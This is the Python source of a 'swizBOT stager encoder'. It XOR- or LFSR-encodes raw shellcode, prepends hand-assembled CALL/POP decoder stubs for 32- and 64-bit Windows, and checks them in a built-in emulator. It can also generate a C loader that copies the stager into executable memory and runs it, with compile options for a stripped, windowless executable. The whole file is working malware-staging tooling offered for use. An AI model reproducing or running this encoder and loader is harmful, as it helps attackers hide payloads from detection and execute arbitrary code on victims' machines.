#!/usr/bin/env python3
"""
swizBOT stager encoder.

XOR / LFSR position-independent decoders in the Jake Swiz CALL/POP
style for x86 (32-bit) and x64 (64-bit) Windows. The decoder is prepended
to the encoded payload; the whole blob is what a loader (or injector)
executes. Decoders are emitted as raw machine code from the byte tables
in this file; stager/decoder_x86.asm and stager/decoder_x64.asm are the
canonical NASM listings and are byte-identical (checked by --selftest).

Decoding is verified in --selftest by executing the stub bytes in a
tiny instruction emulator (no Windows box required) and by re-assembling
the NASM listings when nasm is available.

Usage:
  python3 encoder.py payload.bin out/stager.bin
  python3 encoder.py payload.bin out/stager.bin --lfsr
  python3 encoder.py payload.bin out/stager.bin --noloop --arch x64
  python3 encoder.py payload.bin out/stager.bin --lfsr --loader --arch x64
  python3 encoder.py --selftest
"""

import argparse
import random
import struct
import sys


# ----------------------------------------------------------------------
# XOR / LFSR stream encoders
# ----------------------------------------------------------------------

def xor_encode(data, key):
    return bytes(b ^ key for b in data)


def find_xor_key(data):
    """Pick a key that produces no zero bytes in the encoded stream."""
    for key in range(1, 256):
        if key not in data:
            return key
    raise ValueError("no safe XOR key found; use --lfsr")


def lfsr_encode(data, seed):
    """32-bit LFSR stream (polynomial 0x80200003). Key byte is the low
    byte of the state before each shift - exactly what the asm decoder
    recomputes."""
    out = bytearray()
    state = seed & 0xFFFFFFFF
    for b in data:
        out.append(b ^ (state & 0xFF))
        lsb = state & 1
        state >>= 1
        if lsb:
            state ^= 0x80200003
    return bytes(out)


# ----------------------------------------------------------------------
# Decoder byte tables. Layouts are fixed; only the length/key/seed
# bytes are patched. Patch offsets are explicit so the asm listings can
# be diffed byte-for-byte.
# ----------------------------------------------------------------------

class Stub:
    def __init__(self, arch, kind, base, patches):
        self.arch = arch
        self.kind = kind
        self.base = bytearray(base)
        self.patches = patches  # {name: offset}

    def patched(self, **kwargs):
        out = bytearray(self.base)
        for name, off in self.patches.items():
            val = kwargs[name]
            if isinstance(val, int):
                out[off:off + 1] = bytes([val & 0xFF])
            else:
                out[off:off + len(val)] = val
        return bytes(out)


# kind -> (arch -> stub bytes, patch map)
def _u16(v):
    return struct.pack("<H", v)


def _u32(v):
    return struct.pack("<I", v)


# XOR, counter in cx (payload up to 65535 bytes)
XOR_LOOP = {
    "x86": Stub("x86", "xor-loop",
                bytes([0xEB, 0x0F, 0x5E, 0x31, 0xC9, 0x66, 0xB9, 0, 0,
                       0x80, 0x36, 0, 0x46, 0xE2, 0xFA,
                       0xEB, 0x05, 0xE8, 0xEC, 0xFF, 0xFF, 0xFF]),
                {"len": 7, "key": 11}),
    "x64": Stub("x64", "xor-loop",
                bytes([0xEB, 0x11, 0x5E, 0x31, 0xC9, 0x66, 0xB9, 0, 0,
                       0x80, 0x36, 0, 0x48, 0xFF, 0xC6, 0xE2, 0xF8,
                       0xEB, 0x05, 0xE8, 0xEA, 0xFF, 0xFF, 0xFF]),
                {"len": 7, "key": 11}),
}

# XOR unrolled (no `loop` instruction), counter in al (payload <= 255)
XOR_UNROLLED = {
    "x86": Stub("x86", "xor-unrolled",
                bytes([0xEB, 0x0F, 0x5E, 0x31, 0xC0, 0xB0, 0,
                       0x80, 0x36, 0, 0x46, 0xFE, 0xC8, 0x75, 0xF8,
                       0xEB, 0x05, 0xE8, 0xEC, 0xFF, 0xFF, 0xFF]),
                {"len": 6, "key": 9}),
    "x64": Stub("x64", "xor-unrolled",
                bytes([0xEB, 0x11, 0x5E, 0x31, 0xC0, 0xB0, 0,
                       0x80, 0x36, 0, 0x48, 0xFF, 0xC6, 0xFE, 0xC8, 0x75, 0xF6,
                       0xEB, 0x05, 0xE8, 0xEA, 0xFF, 0xFF, 0xFF]),
                {"len": 6, "key": 9}),
}

# LFSR, state in edx, counter in cx (payload <= 65535). The poly
# constant is baked into the instruction stream.
LFSR_LOOP = {
    "x86": Stub("x86", "lfsr-loop",
                bytes([0xEB, 0x1F, 0x5E, 0x31, 0xC9, 0x66, 0xB9, 0, 0,
                       0x31, 0xD2, 0xBA, 0, 0, 0, 0,
                       0x30, 0x16, 0xD1, 0xEA, 0x73, 0x06,
                       0x81, 0xF2, 0x03, 0x00, 0x20, 0x80,
                       0x46, 0xE2, 0xF1, 0xEB, 0x05, 0xE8, 0xDC, 0xFF, 0xFF, 0xFF]),
                {"len": 7, "seed": 12}),
    "x64": Stub("x64", "lfsr-loop",
                bytes([0xEB, 0x21, 0x5E, 0x31, 0xC9, 0x66, 0xB9, 0, 0,
                       0x31, 0xD2, 0xBA, 0, 0, 0, 0,
                       0x30, 0x16, 0xD1, 0xEA, 0x73, 0x06,
                       0x81, 0xF2, 0x03, 0x00, 0x20, 0x80,
                       0x48, 0xFF, 0xC6, 0xE2, 0xEF,
                       0xEB, 0x05, 0xE8, 0xDA, 0xFF, 0xFF, 0xFF]),
                {"len": 7, "seed": 12}),
}

MAX_LEN = {
    "xor-loop": 65535,
    "xor-unrolled": 255,
    "lfsr-loop": 65535,
}


def build_stub(arch, kind, length, key=0, seed=0):
    table = {"xor-loop": XOR_LOOP, "xor-unrolled": XOR_UNROLLED,
             "lfsr-loop": LFSR_LOOP}[kind]
    stub = table[arch]
    if kind == "xor-loop":
        return stub.patched(len=_u16(length), key=key)
    if kind == "xor-unrolled":
        return stub.patched(len=length, key=key)
    return stub.patched(len=_u16(length), seed=_u32(seed & 0xFFFFFFFF))


# ----------------------------------------------------------------------
# Tiny x86/x64 emulator used to prove the decoders actually decode.
# Supports exactly the opcodes the stubs above use.
# ----------------------------------------------------------------------

class Emu:
    def __init__(self, code, bits):
        self.code = code
        self.bits = bits
        self.regs = {"e": 0, "c": 0, "d": 0, "s": 0, "a": 0}
        self.cf = 0
        self.mask = (1 << bits) - 1
        self.ip = 0
        self.stack = []

    def r(self, name):
        return self.regs[name]

    def setr(self, name, val):
        self.regs[name] = val & self.mask

    def u8(self, off):
        return self.code[off]

    def i8(self, off):
        v = self.code[off]
        return v - 256 if v > 127 else v

    def i32(self, off):
        return struct.unpack("<i", self.code[off:off + 4])[0]

    def jmp8(self):
        """rel8 jump/branch at self.ip: target = ip+2+rel."""
        self.ip = self.ip + 2 + self.i8(self.ip + 1)

    def step(self):
        op = self.u8(self.ip)
        nxt = self.ip + 1

        if op == 0xEB:                       # jmp rel8
            self.jmp8()
        elif op == 0xE8:                     # call rel32
            rel = self.i32(nxt)
            self.stack.append(nxt + 4)
            self.ip = nxt + 4 + rel
        elif op == 0x5E:                     # pop esi/rsi
            self.setr("s", self.stack.pop())
            self.ip = nxt
        elif op == 0x31:                     # xor r32, r32 (reg==rm only)
            modrm = self.u8(nxt)
            reg = (modrm >> 3) & 7
            rm = modrm & 7
            if modrm & 0xC0 != 0xC0 or reg != rm:
                raise SystemExit(f"unsupported 31 modrm {modrm:02x}")
            name = {0: "a", 1: "c", 2: "d", 3: "b", 4: "e", 5: "s"}.get(reg)
            self.setr(name, 0)
            self.ip = nxt + 1
        elif op in (0xB0, 0xB1, 0xB2):       # mov al/cl/dl, imm8
            self.setr({0xB0: "a", 0xB1: "c", 0xB2: "d"}[op], self.u8(nxt))
            self.ip = nxt + 1
        elif op == 0xBA:                     # mov edx, imm32
            self.setr("d", struct.unpack("<I", self.code[nxt:nxt + 4])[0])
            self.ip = nxt + 4
        elif op == 0x66:                     # 66 B9 iw -> mov cx, imm16
            sub = self.u8(nxt)
            if sub != 0xB9:
                raise SystemExit(f"unsupported 66 prefix opcode {sub:02x}")
            low = self.code[nxt + 1] | (self.code[nxt + 2] << 8)
            self.setr("c", low)
            self.ip = nxt + 3
        elif op == 0x80:                     # 80 /2 -> xor byte [esi], imm8
            modrm = self.u8(nxt)
            if modrm != 0x36:
                raise SystemExit(f"unsupported 80 modrm {modrm:02x}")
            imm = self.u8(nxt + 1)
            base = self.r("s")
            self.code[base] ^= imm
            self.ip = nxt + 2
        elif op == 0x30:                     # 30 /r -> xor byte [r/m], r8
            modrm = self.u8(nxt)
            if modrm != 0x16:                # [esi] ^= dl
                raise SystemExit(f"unsupported 30 modrm {modrm:02x}")
            base = self.r("s")
            self.code[base] ^= self.r("d") & 0xFF
            self.ip = nxt + 1
        elif op == 0x81:                     # 81 /6 id -> xor edx, imm32
            modrm = self.u8(nxt)
            if modrm != 0xF2:
                raise SystemExit(f"unsupported 81 modrm {modrm:02x}")
            imm = struct.unpack("<I", self.code[nxt + 1:nxt + 5])[0]
            self.setr("d", self.r("d") ^ imm)
            self.ip = nxt + 5
        elif op == 0x46:                     # inc esi
            self.setr("s", self.r("s") + 1)
            self.ip = nxt
        elif op == 0x48:                     # 48 FF /0 -> inc rsi (x64)
            sub = self.u8(nxt)
            if sub != 0xFF or self.u8(nxt + 1) != 0xC6:
                raise SystemExit("unsupported 48-prefixed opcode")
            self.setr("s", self.r("s") + 1)
            self.ip = nxt + 2
        elif op == 0xFE:                     # FE C8 -> dec al
            sub = self.u8(nxt)
            if sub != 0xC8:
                raise SystemExit(f"unsupported FE opcode {sub:02x}")
            self.setr("a", self.r("a") - 1)
            self.ip = nxt + 1
        elif op == 0x75:                     # jnz rel8
            if self.r("a") != 0:
                self.jmp8()
            else:
                self.ip = nxt + 1
        elif op == 0xE2:                     # loop rel8 (counter = cx/ecx/rcx)
            self.setr("c", self.r("c") - 1)
            if self.r("c") != 0:
                self.jmp8()
            else:
                self.ip = nxt + 1
        elif op == 0xD1:                     # D1 EA -> shr edx, 1
            sub = self.u8(nxt)
            if sub != 0xEA:
                raise SystemExit(f"unsupported D1 opcode {sub:02x}")
            self.cf = self.r("d") & 1
            self.setr("d", self.r("d") >> 1)
            self.ip = nxt + 1
        elif op == 0x73:                     # 73 rel8 -> jnc
            if self.cf == 0:
                self.jmp8()
            else:
                self.ip = nxt + 1
        else:
            raise SystemExit(f"unsupported opcode {op:02x} at {self.ip}")

    def run_until(self, target):
        guard = 0
        while self.ip != target:
            self.step()
            guard += 1
            if guard > 1 << 20:
                raise SystemExit("emulator runaway")


def emulate_decode(stager, payload_off, bits):
    """Run the stub; return the decoded payload bytes."""
    mem = bytearray(stager)
    emu = Emu(mem, bits)
    emu.run_until(payload_off)
    return bytes(mem[payload_off:])


def selftest():
    random.seed(0xC0FFEE)
    payloads = [b"A", b"\x00\x01\x02", bytes(random.randbytes(200)),
                bytes(random.randbytes(3000))]
    total = 0
    for arch in ("x86", "x64"):
        bits = 32 if arch == "x86" else 64
        for kind in ("xor-loop", "lfsr-loop", "xor-unrolled"):
            for payload in payloads:
                if len(payload) > MAX_LEN[kind]:
                    continue
                if kind == "xor-loop":
                    try:
                        key = find_xor_key(payload)
                    except ValueError:
                        continue
                    encoded = xor_encode(payload, key)
                    stub = build_stub(arch, kind, len(payload), key=key)
                elif kind == "lfsr-loop":
                    seed = random.getrandbits(32)
                    encoded = lfsr_encode(payload, seed)
                    stub = build_stub(arch, kind, len(payload), seed=seed)
                else:
                    key = find_xor_key(payload)
                    encoded = xor_encode(payload, key)
                    stub = build_stub(arch, kind, len(payload), key=key)

                stager = stub + encoded
                decoded = emulate_decode(stager, len(stub), bits)
                assert decoded == payload, (
                    f"{arch}/{kind}: decode mismatch for {len(payload)} bytes")
                total += 1
    print(f"[+] selftest: {total} emulated decode round-trips OK (x86/x64, "
          f"xor/lfsr/unrolled)")


def nasm_parity():
    """Byte-compare the emitted stubs with the NASM listings (when nasm
    is installed and the listings are present). The listing files contain
    exactly the three stubs in order: xor-loop, xor-unrolled, lfsr-loop."""
    import os
    import shutil
    import subprocess
    import tempfile

    if shutil.which("nasm") is None:
        print("[!] nasm not found; skipping listing parity check")
        return
    for arch in ("x86", "x64"):
        asm_path = os.path.join(os.path.dirname(__file__),
                                f"decoder_{arch}.asm")
        if not os.path.exists(asm_path):
            print(f"[!] {asm_path} missing; skipping parity check")
            continue
        order = ["xor-loop", "xor-unrolled", "lfsr-loop"]
        parts = []
        for kind in order:
            table = {"xor-loop": XOR_LOOP, "xor-unrolled": XOR_UNROLLED,
                     "lfsr-loop": LFSR_LOOP}[kind][arch]
            if kind == "xor-loop":
                parts.append(table.patched(len=b"\xcc\xcc", key=0xCC))
            elif kind == "xor-unrolled":
                parts.append(table.patched(len=0xCC, key=0xCC))
            else:
                parts.append(table.patched(len=b"\xcc\xcc", seed=b"\xcc\xcc\xcc\xcc"))
        expect = b"".join(parts)

        with tempfile.TemporaryDirectory() as tmp:
            obj = os.path.join(tmp, "s.bin")
            subprocess.run(["nasm", "-f", "bin", "-o", obj, asm_path],
                           check=True, capture_output=True)
            raw = open(obj, "rb").read()
        if raw != expect:
            raise SystemExit(
                f"nasm parity FAILED for {arch}\n got {raw.hex()}\n"
                f"want {expect.hex()}")
        print(f"[+] nasm parity OK: decoder_{arch}.asm matches emitted stubs")


def emit_asm(arch):
    """Print the canonical NASM listing for one architecture."""
    kinds = [("xor_loop", XOR_LOOP[arch], "len", "key"),
             ("xor_unrolled", XOR_UNROLLED[arch], "len", "key"),
             ("lfsr_loop", LFSR_LOOP[arch], "len", "seed")]
    out = []
    out.append("; swizBOT decoder listing - %s" % ("32-bit" if arch == "x86" else "64-bit"))
    out.append("; CALL/POP XOR decoder family (Jake Swiz technique)")
    out.append("; Placeholder bytes are 0xCC and are patched by stager/encoder.py.")
    out.append("; Verify: nasm -f bin decoder_%s.asm && compare with encoder output" % arch)
    out.append("")
    if arch == "x86":
        out.append("BITS 32")
    else:
        out.append("BITS 64")
    out.append("")
    for kind, stub, lenname, keyname in kinds:
        out.append(f"stub_{kind}:")
        blob = stub.base  # patched with CC placeholders below
        blob = bytearray(stub.base)
        if kind == "xor_loop":
            blob[stub.patches["len"]:stub.patches["len"] + 2] = b"\xCC\xCC"
            blob[stub.patches["key"]] = 0xCC
        elif kind == "xor_unrolled":
            blob[stub.patches["len"]] = 0xCC
            blob[stub.patches["key"]] = 0xCC
        else:
            blob[stub.patches["len"]:stub.patches["len"] + 2] = b"\xCC\xCC"
            blob[stub.patches["seed"]:stub.patches["seed"] + 4] = b"\xCC\xCC\xCC\xCC"
        for i in range(0, len(blob), 16):
            chunk = blob[i:i + 16]
            db = ", ".join("0x%02x" % b for b in chunk)
            out.append(f"    db {db}")
        out.append(f"stub_{kind}_end:")
        out.append("")
    return "\n".join(out) + "\n"


def build(payload_path, output_path, use_lfsr, no_loop, arch, loader):
    with open(payload_path, "rb") as f:
        payload = f.read()
    if not payload:
        sys.exit("[!] payload is empty")

    if no_loop:
        kind = "xor-unrolled"
    elif use_lfsr:
        kind = "lfsr-loop"
    else:
        kind = "xor-loop"

    if len(payload) > MAX_LEN[kind]:
        sys.exit(f"[!] payload {len(payload)} bytes exceeds {kind} limit "
                 f"of {MAX_LEN[kind]} (use xor-loop/lfsr for larger blobs)")

    if use_lfsr:
        seed = random.getrandbits(32)
        encoded = lfsr_encode(payload, seed)
        stub = build_stub(arch, kind, len(payload), seed=seed)
        print(f"[+] encoding: LFSR (seed 0x{seed:08x})")
    else:
        key = find_xor_key(payload)
        encoded = xor_encode(payload, key)
        stub = build_stub(arch, kind, len(payload), key=key)
        print(f"[+] encoding: XOR (key 0x{key:02x})")

    stager = stub + encoded
    with open(output_path, "wb") as f:
        f.write(stager)

    print(f"[+] payload: {len(payload)} bytes")
    print(f"[+] decoder: {kind} ({len(stub)} bytes, {arch})")
    print(f"[+] stager:  {output_path} ({len(stager)} bytes)")

    if loader:
        write_loader(stager, arch, "loader.c")


def write_loader(stager, arch, loader_path):
    blob = "".join("\\x%02x" % b for b in stager)
    compile_cc = ("i686-w64-mingw32-gcc" if arch == "x86"
                  else "x86_64-w64-mingw32-gcc")
    c = f"""/*
 * swizBOT loader - generated by stager/encoder.py
 * Decoder family after Jake Swiz (0xXyc).
 * Compile ({arch}):
 *   {compile_cc} {loader_path} -o loader.exe -s -Os -fno-stack-protector
 *   {compile_cc} {loader_path} -o loader.exe -mwindows -s -Os -fno-stack-protector
 */
#include <windows.h>
#include <string.h>

static unsigned char stage[] = "{blob}";

int main(void) {{
    void *mem = VirtualAlloc(NULL, sizeof(stage), MEM_COMMIT | MEM_RESERVE,
                             PAGE_EXECUTE_READWRITE);
    if (mem == NULL) return 1;
    memcpy(mem, stage, sizeof(stage));
    ((void (*)(void))mem)();
    return 0;
}}
"""
    with open(loader_path, "w") as f:
        f.write(c)
    print(f"[+] loader:  {loader_path} ({compile_cc})")


def main():
    ap = argparse.ArgumentParser(
        description="swizBOT stager encoder (CALL/POP XOR/LFSR, x86/x64)")
    ap.add_argument("input", nargs="?", help="raw payload file")
    ap.add_argument("output", nargs="?", help="stager output file")
    ap.add_argument("--lfsr", action="store_true", help="LFSR stream encoding")
    ap.add_argument("--noloop", action="store_true",
                    help="unrolled decoder (no loop instruction; max 255 bytes)")
    ap.add_argument("--arch", choices=("x86", "x64"), default="x86",
                    help="decoder architecture (default x86)")
    ap.add_argument("--loader", action="store_true", help="write loader.c")
    ap.add_argument("--selftest", action="store_true",
                    help="run emulated decode round-trips and nasm parity")
    ap.add_argument("--emit-asm", choices=("x86", "x64"),
                    help="print the canonical NASM listing for an arch")
    args = ap.parse_args()

    if args.selftest:
        selftest()
        nasm_parity()
        return
    if args.emit_asm:
        sys.stdout.write(emit_asm(args.emit_asm))
        return
    if not args.input or not args.output:
        ap.error("input and output are required (or use --selftest)")
    if args.lfsr and args.noloop:
        ap.error("--lfsr and --noloop are mutually exclusive")
    build(args.input, args.output, args.lfsr, args.noloop, args.arch,
          args.loader)


if __name__ == "__main__":
    main()
